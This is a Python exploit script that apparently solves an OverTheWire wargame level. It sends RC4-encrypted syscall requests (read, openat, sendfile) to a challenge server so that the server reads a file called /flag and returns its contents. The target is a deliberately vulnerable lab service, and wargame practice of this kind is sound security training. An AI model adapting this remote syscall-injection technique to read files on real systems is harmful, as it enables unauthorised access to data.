import socket
import struct
import time


# ========== RC4 Implementation ==========
def rc4(key, data):
    S = list(range(256))
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(char ^ K)

    return bytes(out)


# ========== Constants ==========
REMOTE_IP = "drifter.labs.overthewire.org"
REMOTE_PORT = 22_200

SYS_read = 63
SYS_write = 64
SYS_openat = 56
SYS_exit = 93
SYS_sendfile = 71

# Safe memory address
ADDR = 0x100000

FILENAME = b"/flag\x00"


# ========== Helpers ==========
def derive_key(ip, port):
    ip_bytes = socket.inet_aton(ip)
    port_bytes = struct.pack('>H', port)
    return ip_bytes + port_bytes


def recv_exact(sock, size):
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("Socket closed before receiving expected data")
        data += chunk
    return data


def send_syscall(sock, key, syscall_num, arg1=0, arg2=0, arg3=0, arg4=0, arg5=0, arg6=0):
    payload = struct.pack('<9I', syscall_num, arg1, arg2, arg3, arg4, arg5, arg6, 0, 0)
    encrypted = rc4(key, payload)

    print(f"[DEBUG] syscall={syscall_num}, args={[arg1, arg2, arg3, arg4, arg5, arg6]}")
    print(f"[DEBUG] encrypted: {encrypted.hex()}")
    
    sock.sendall(encrypted)
    result = recv_exact(sock, 4)
    retval = struct.unpack('<I', result)[0]
    return retval


# ========== Main ==========
def main():
    # 1. Create local socket
    local = socket.socket()
    local.bind(('', 0))
    local.listen(1)
    local_ip, local_port = local.getsockname()
    print(f"[+] Local IP: {local_ip}, Port: {local_port}")

    # 2. Connect to remote
    sock = socket.socket()
    sock.connect((REMOTE_IP, REMOTE_PORT))
    sock.sendall(f"{local_ip} {local_port}\n".encode())

    # 3. Accept connection from remote (after it connects back to us)
    conn, addr = local.accept()
    print(f"[+] Remote connected from {addr}")

    # 4. Derive key
    key = derive_key(local_ip, local_port)

    # 5. Send SYS_read(0, ADDR, len("/flag\x00")) to write filename into memory
    print("[+] Writing filename to memory...")
    send_syscall(conn, key, SYS_read, 0, ADDR, len(FILENAME))

    # 6. Send filename to remote stdin (via real socket, not syscall)
    conn.sendall(FILENAME)

    # 7. Send SYS_openat(AT_FDCWD=0xffffff9c, filename_ptr=ADDR, flags=0)
    print("[+] Opening file...")
    fd = send_syscall(conn, key, SYS_openat, 0xffffff9c, ADDR, 0)
    print(f"[+] Got file descriptor: {fd}")

    # 8. Send SYS_sendfile(stdout=1, input_fd=fd, offset=NULL, count=100)
    print("[+] Sending file contents...")
    send_syscall(conn, key, SYS_sendfile, 1, fd, 0, 100)

    # 9. Done - Exit cleanly
    print("[+] Exiting")
    send_syscall(conn, key, SYS_exit, 0)


if __name__ == "__main__":
    main()
